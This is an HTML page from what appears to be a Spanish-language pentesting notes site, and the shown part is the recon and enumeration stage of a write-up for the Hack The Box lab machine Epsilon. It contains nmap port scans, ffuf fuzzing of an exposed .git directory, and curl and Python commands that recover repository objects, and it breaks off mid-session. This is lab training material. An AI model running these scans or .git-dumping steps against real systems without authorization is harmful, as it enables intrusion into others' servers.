@@ -1,0 +1,1260 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.3.1, mkdocs-material-8.3.9">
+    
+    
+      
+        <title>Epsilon - Pentesting</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.1d29e8d0.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.cbb835fc.min.css">
+        
+      
+      
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#epsilon-htb" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Pentesting" class="md-header__button md-logo" aria-label="Pentesting" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Pentesting
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Epsilon
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+          
+            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+          
+            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+      </form>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Pentesting" class="md-nav__button md-logo" aria-label="Pentesting" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Pentesting
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        Introdución
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Máquinas
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Máquinas" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Máquinas
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_1" type="checkbox" id="__nav_2_1" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_1">
+          Linux
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Linux" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_1">
+          <span class="md-nav__icon md-icon"></span>
+          Linux
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../academy/" class="md-nav__link">
+        Academy
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bank/" class="md-nav__link">
+        Bank
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bolt/" class="md-nav__link">
+        Bolt
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../chainsaw/" class="md-nav__link">
+        Chainsaw
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Epsilon
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Epsilon
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    Recon
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enum" class="md-nav__link">
+    Enum
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hacking-aws-lambda" class="md-nav__link">
+    Hacking AWS - LAMBDA
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssti-server-side-template-injection" class="md-nav__link">
+    SSTI (Server Side Template Injection)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#escalate-privileges" class="md-nav__link">
+    Escalate privileges
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../flustered/" class="md-nav__link">
+        Flustered
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../goodgames/" class="md-nav__link">
+        Goodgames
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../laboratory/" class="md-nav__link">
+        Laboratory
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nodeblog/" class="md-nav__link">
+        Nodeblog
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nunchucks/" class="md-nav__link">
+        Nunckucks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pressed/" class="md-nav__link">
+        Pressed
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../unbalanced/" class="md-nav__link">
+        Unbalanced
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../validation/" class="md-nav__link">
+        Validation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zipper/" class="md-nav__link">
+        Zipper
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_2" type="checkbox" id="__nav_2_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_2">
+          Windows
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Windows" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_2">
+          <span class="md-nav__icon md-icon"></span>
+          Windows
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../windows/arkham/" class="md-nav__link">
+        Arkham
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../windows/return/" class="md-nav__link">
+        Return
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          Recursos
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Recursos" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Recursos
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/docker/" class="md-nav__link">
+        Docker
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/exploits/" class="md-nav__link">
+        Exploits
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/inyecciones/" class="md-nav__link">
+        Inyecciones
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/shells/" class="md-nav__link">
+        Shells
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/tools/" class="md-nav__link">
+        Tools
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/win-commands/" class="md-nav__link">
+        Windows Commands
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+
+<h1 id="epsilon-htb">Epsilon HTB</h1>
+<h2 id="recon">Recon</h2>
+<ul>
+<li>
+<p>Se comprueba que la máquina está activa:</p>
+<blockquote>
+<p><code>ping 10.10.11.134</code></p>
+</blockquote>
+</li>
+</ul>
+<h2 id="enum">Enum</h2>
+<ul>
+<li>
+<p>Se realiza un scan de los 65535 puertos TCP:</p>
+<blockquote>
+<p><code>nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.11.134</code></p>
+</blockquote>
+</li>
+<li>
+<p>Se realiza un scan de los puertos abiertos:</p>
+<blockquote>
+<p><code>nmap -sCV -p22,80 10.10.11.134 -oN openPorts</code></p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a> PORT   STATE SERVICE VERSION
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>| ssh-hostkey: 
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>80/tcp open  http    Apache httpd 2.4.41
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>| http-git: 
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>|   10.10.11.134:80/.git/
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>|     Git repository found!
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>|     Repository description: Unnamed repository; edit this file &#39;description&#39; to name the...
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>|_    Last commit message: Updating Tracking API  # Please enter the commit message for...
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>|_http-server-header: Apache/2.4.41 (Ubuntu)
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>|_http-title: 403 Forbidden
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div>
+</li>
+<li>
+<p>Fuzzing (se fuzzea el directorio .git que nos reporta nmap):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://10.10.11.134/.git/FUZZ -e .php,.bak,.git -t 300
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>    /&#39;___\  /&#39;___\           /&#39;___\       
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>   /\ \__/ /\ \__/  __  __  /\ \__/       
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>    \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>     \ \_\   \ \_\  \ \____/  \ \_\       
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>      \/_/    \/_/   \/___/    \/_/       
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>   v1.4.1-dev
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>________________________________________________
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>:: Method           : GET
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>:: URL              : http://10.10.11.134/.git/FUZZ
+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>:: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>:: Extensions       : .php .bak .git 
+<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>:: Follow redirects : false
+<a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>:: Calibration      : false
+<a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>:: Timeout          : 10
+<a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>:: Threads          : 300
+<a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>:: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+<a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>________________________________________________
+<a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>
+<a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>index                   [Status: 200, Size: 225, Words: 3, Lines: 2, Duration: 4912ms]
+<a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>config                  [Status: 200, Size: 92, Words: 9, Lines: 6, Duration: 64ms]
+<a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>info                    [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 544ms]
+<a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>logs                    [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 121ms]
+<a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a>objects                 [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 59ms]
+<a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a>description             [Status: 200, Size: 73, Words: 10, Lines: 2, Duration: 118ms]
+<a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a>branches                [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 132ms]
+<a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a>refs                    [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 99ms]
+<a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a>.php                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 82ms]
+<a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a>                        [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 83ms]
+<a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a>HEAD                    [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 108ms]
+</code></pre></div>
+</li>
+<li>
+<p>Se recolecta información de los directorios encontrados:
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>curl http://10.10.11.134/.git/index <span class="p">|</span> strings
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>                                Dload  Upload   Total   Spent    Left  Speed
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="m">100</span>   <span class="m">225</span>  <span class="m">100</span>   <span class="m">225</span>    <span class="m">0</span>     <span class="m">0</span>   <span class="m">2960</span>      <span class="m">0</span> --:--:-- --:--:-- --:--:--  <span class="m">2960</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>DIRC
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>        server.py
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>track_api_CR_148.py
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="c1"># Añadimos el dominio y subdominio a hosts:</span>
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>cat track_api_CR_148.py <span class="p">|</span> grep htb                                                       
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="nv">endpoint_url</span><span class="o">=</span><span class="s1">&#39;http://cloud.epsilon.htb&#39;</span><span class="o">)</span>
+</code></pre></div></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>curl http://10.10.11.134/.git/refs/heads/master                                          
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>c622771686bd74c16ece91193d29f85b5f9ffa91
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>╭─░▒▓    /home/x/Documentos/htb/epsilon/10.10.11.134/10.10.11.134  root@xOS3  ✔ 
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>╰─ curl http://10.10.11.134/.git/objects/c6/22771686bd74c16ece91193d29f85b5f9ffa91 <span class="p">|</span> strings
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>                                Dload  Upload   Total   Spent    Left  Speed
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="m">100</span>   <span class="m">154</span>  <span class="m">100</span>   <span class="m">154</span>    <span class="m">0</span>     <span class="m">0</span>   <span class="m">1949</span>      <span class="m">0</span> --:--:-- --:--:-- --:--:--  <span class="m">1974</span>
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="nv">oe</span><span class="o">=</span>L
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Se encuentra un fichero comprimido con zlib, se descomprime con python pero no hay nada de gran interes:</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">python</span> 
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">Python</span> <span class="mf">3.9.2</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">Feb</span> <span class="mi">28</span> <span class="mi">2021</span><span class="p">,</span> <span class="mi">17</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">44</span><span class="p">)</span> 
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="p">[</span><span class="n">GCC</span> <span class="mf">10.2.1</span> <span class="mi">20210110</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="n">Type</span> <span class="s2">&quot;help&quot;</span><span class="p">,</span> <span class="s2">&quot;copyright&quot;</span><span class="p">,</span> <span class="s2">&quot;credits&quot;</span> <span class="ow">or</span> <span class="s2">&quot;license&quot;</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="o">.</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">zlib</span>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="o">&gt;&gt;&gt;</span> 
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="o">&gt;&gt;&gt;</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;22771686bd74c16ece91193d29f85b5f9ffa91&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="o">&gt;&gt;&gt;</span> <span class="n">decompressed_data</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
